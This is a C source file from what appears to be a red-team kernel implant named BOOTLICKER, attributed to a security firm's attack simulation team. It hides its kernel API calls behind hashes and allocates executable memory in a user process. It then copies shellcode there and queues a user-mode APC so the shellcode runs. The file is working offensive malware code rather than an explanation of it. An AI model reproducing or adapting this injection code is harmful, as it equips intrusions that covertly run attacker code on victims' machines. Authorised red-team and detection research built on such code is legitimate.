/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT ;

BOOLEAN
NTAPI
KeInsertQueueApc(
	_In_ PRKAPC	Apc,
	_In_ PVOID	SystemArgument1,
	_In_ PVOID	SystemArgument2,
	_In_ KPRIORITY	Increment
);

VOID
NTAPI
KeInitializeApc(
	_In_ PRKAPC	Apc,
	_In_ PRKTHREAD	Thread,
	_In_ KAPC_ENVIRONMENT	Environment,
	_In_ PVOID	KernelRoutine,
	_In_ PVOID	RundownRoutine,
	_In_ PVOID	NormalRoutine,
	_In_ KPROCESSOR_MODE	ProcessMode,
	_In_ PVOID	NormalContext
);

typedef struct
{
	D_API( ZwAllocateVirtualMemory );
	D_API( PsGetCurrentThread );
	D_API( KeInsertQueueApc );
	D_API( KeInitializeApc );
	D_API( ExAllocatePool );
	D_API( ExFreePool );
	D_API( ZwClose );
} API ;

/* API Hashes */

#define H_API_ZWALLOCATEVIRTUALMEMORY		0xb20c09db /* ZwAllocateVirtualMemory */
#define H_API_PSGETCURRENTTHREAD		0xaef4ed03 /* PsGetCurrentThread */
#define H_API_KEINSERTQUEUEAPC			0xb406c5c3 /* KeInsertQueueApc */
#define H_API_KEINITIALIZEAPC			0x0dd2d23b /* KeInitializeApc */
#define H_API_EXALLOCATEPOOL			0xa1fe8ce1 /* ExAllocatePool */
#define H_API_EXFREEPOOL			0x3f7747de /* ExFreePool */	
#define H_API_ZWCLOSE				0xe391398c /* ZwClose */

/*!
 *
 * Purpose:
 *
 * Inserts a APC callback into the usermode process.
 *
!*/
D_SEC( D ) VOID NTAPI ApcNormalRoutine( _In_ PVOID NormalContext, _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2 )
{
	API	Api;
	SIZE_T	Len = 0;

	PVOID	Ptr = NULL;
	PKMTBL	Tbl = NULL;
	PRKAPC	Apc = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Tbl = C_PTR( G_PTR( KmTbl ) );

	Api.ZwAllocateVirtualMemory = PeGetFuncEat( Tbl->KernelBase, H_API_ZWALLOCATEVIRTUALMEMORY ); 
	Api.PsGetCurrentThread      = PeGetFuncEat( Tbl->KernelBase, H_API_PSGETCURRENTTHREAD );
	Api.KeInsertQueueApc        = PeGetFuncEat( Tbl->KernelBase, H_API_KEINSERTQUEUEAPC );
	Api.KeInitializeApc         = PeGetFuncEat( Tbl->KernelBase, H_API_KEINITIALIZEAPC );
	Api.ExAllocatePool          = PeGetFuncEat( Tbl->KernelBase, H_API_EXALLOCATEPOOL );
	Api.ExFreePool              = PeGetFuncEat( Tbl->KernelBase, H_API_EXFREEPOOL );

	/* Calculcate the length of the shellcode */
	Len = U_PTR( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( UmEnt ) );

	/* Allocate a buffer to hold the usermode shellcode */
	if ( NT_SUCCESS( Api.ZwAllocateVirtualMemory( NtCurrentProcess(), &Ptr, 0, &( SIZE_T ){ Len }, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) ) {
		/* Copy over the usermode shellcode */
		__builtin_memcpy( Ptr, C_PTR( G_PTR( UmEnt ) ), Len );

		/* Allocate a KAPC structure */
		if ( ( Apc = Api.ExAllocatePool( NonPagedPool, sizeof( KAPC ) ) ) != NULL ) {
			/* Initialize an APC */
			Api.KeInitializeApc( Apc, 
					     Api.PsGetCurrentThread(), 
					     CurrentApcEnvironment, 
					     C_PTR( G_PTR( ApcKernelRoutine ) ), 
					     NULL, 
					     Ptr, 
					     UserMode, 
					     NULL );

			/* Attempt to insert to the queue */
			if ( ! Api.KeInsertQueueApc( Apc, NULL, NULL, 0 ) ) {
				/* Free if failed! */
				Api.ExFreePool( Apc );
			};
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};

/*!
 *
 * Purpose:
 *
 * Empty kernel APC routine thats executed for user
 * and kernel mode.
 *
!*/
D_SEC( D ) VOID NTAPI ApcKernelRoutine( _In_ PRKAPC Apc, _In_ PVOID* NormalRoutine, _In_ PVOID* NormalContext, _In_ PVOID* SystemArgument1, _In_ PVOID* SystemArgument2 ) 
{
	API	Api;
	PKMTBL	Tbl = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Get a pointer to the table */
	Tbl = C_PTR( G_PTR( KmTbl ) );

	Api.ExFreePool = PeGetFuncEat( Tbl->KernelBase, H_API_EXFREEPOOL );
	Api.ExFreePool( Apc );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};
